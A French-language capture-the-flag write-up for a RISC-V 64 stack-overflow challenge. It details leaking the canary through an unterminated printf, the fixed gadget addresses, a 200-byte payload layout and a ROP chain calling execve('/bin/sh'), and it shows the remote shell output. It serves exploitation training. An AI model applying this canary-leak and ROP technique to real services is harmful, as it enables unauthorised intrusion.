# PWN#Epsilon — vault RISC-V 64 (canary leak + syscall ROP)

## Statut

Résolu. Shell distant obtenu (`uid=65534(nobody)`), flag lu via `cat /flag/flag.txt` : `CTF{REDACTED}`.
Le vrai flag n'est pas conservé dans le dépôt.

## Cible

- Service : `<HOST>:<PORT>` (TCP).
- Architecture : **RISC-V 64, little-endian**, binaire **non-PIE** (gadgets à adresses fixes).
- Le binaire n'était pas fourni localement : l'analyse et la validation ont été faites directement contre le service.
- Prompt du programme : `Enter your name: ` puis `Leave a message for the vault keeper: `.

## Indices

- Le nom est lu avec un `read(0, buf, 0x41)` dans un buffer de 64 octets, puis affiché via `printf("Hello, %s\n", buf)` **sans terminaison NUL** → fuite de pile.
- Le 65e octet écrase le NUL de poids faible du canari, ce qui laisse `printf` continuer et révéler les 7 octets suivants du canari.
- Le message est lu avec `read(0, buf, 0xc8)` dans un buffer de 64 octets → débordement de pile contrôlé après le canari.
- Canari 8 octets little-endian dont le LSB vaut toujours `0x00`.

## Fuite du canari

Payload de nom : `A*64 + B`.

```
Hello, AAAA...B | canari[1:8]
```

- `canary = b"\x00" + leak[65:72]`.
- **Piège** : un des 7 octets suivants peut être un `0x00` aléatoire ; `%s` s'arrête alors avant les 7 octets. La fuite est courte et il faut **se reconnecter** jusqu'à obtenir 7 octets pleins (40 à 60 tentatives suffisent en pratique).

## Gadgets (RISC-V, adresses fixes)

| Gadget | Adresse | Effet |
|---|---|---|
| `execve` stub | `0x396d4` | `li a7, 221 ; ecall` |
| `"/bin/sh"` | `0x52ab8` | chaîne dans le binaire |
| `G_a1` | `0x19cbc` | `c.ldsp a1, 8(sp) ; c.ldsp ra, 0x18(sp) ; addi16sp 0x20 ; jr ra` |
| `G_a2` | `0x38884` | `c.ldsp a2, 8(sp) ; c.ldsp ra, 0x18(sp) ; c.add a0, a2 ; addi16sp 0x20 ; jr ra` |
| `G_a0` | `0x4df9e` | `c.ldsp a0, 0x18(sp) ; c.ldsp ra, 0x28(sp) ; addi16sp 0x30 ; jr ra` |

Les gadgets compacts `c.ldsp` lisent leurs arguments à `sp + offset`, chargent `ra`, puis avancent `sp` (`addi16sp`) avant `jr ra`. Cela donne un enchaînement de type « load-and-pivot » sans dépendre de la libc.

## Chaîne d'exploitation

Objectif : `execve("/bin/sh", NULL, NULL)` (syscall 221).

Payload de 200 octets :

```
[0..63]    A*64                  filler jusqu'au canari
[64..71]   canary
[72..79]   S*8                   saved s0 (junk)
[80..87]   G_a1                  adresse de retour
[88..199]  région ROP contrôlée (0x70 octets)
```

Région ROP (offsets relatifs à `sp` au premier gadget) :

```
0x08  p64(0)        -> a1 = 0
0x18  p64(G_a2)     -> ra
0x28  p64(0)        -> a2 = 0  (c.add a0, a2 : a0 += 0)
0x38  p64(G_a0)     -> ra
0x58  p64(BINSH)    -> a0 = "/bin/sh"
0x68  p64(EXECVE)   -> ra = li a7,221 ; ecall
```

Déroulé :

1. `ret` vers `G_a1` : `a1 = 0`, saute à `G_a2`, `sp += 0x20`.
2. `G_a2` : `a2 = 0`, `a0 += a2`, saute à `G_a0`, `sp += 0x20`.
3. `G_a0` : `a0 = "/bin/sh"`, saute au stub `execve`, `sp += 0x30`.
4. `li a7, 221 ; ecall` → shell.

Le payload est envoyé en réponse à `vault keeper: `, puis les commandes sont envoyées sur le shell.

## Validation observée

```
$ id
uid=65534(nobody) gid=65534(nogroup) groups=65534(nogroup)
$ cat /flag/flag.txt
CTF{REDACTED}
```

L'exploit est reproductible : seul le canari change entre deux connexions, et il est refuité à chaque fois. Voir `epsilon_exploit.py` (script local) pour l'implémentation pwntools.

## Pièges

- **Fuite tronquée** : le canari peut contenir un octet nul ; boucler sur de nouvelles connexions au lieu de supposer que le premier leak est complet.
- **Offsets `c.ldsp`** : toute la chaîne dépend des décalages exacts `sp+8 / sp+0x18 / sp+0x28` et des `addi16sp` ; vérifier `len(payload) == 200` et l'alignement de la région.
- **`c.add a0, a2` additionne** : ici `a2 = 0`, donc `a0` est préservé jusqu'au gadget suivant qui le remplace par `"/bin/sh"`; ne pas compter sur `c.add` comme un simple `mv`.
- **Pas de binaire local** : inutile d'installer `qemu-riscv64` ; valider directement en remote, le service est le seul oracle fiable.
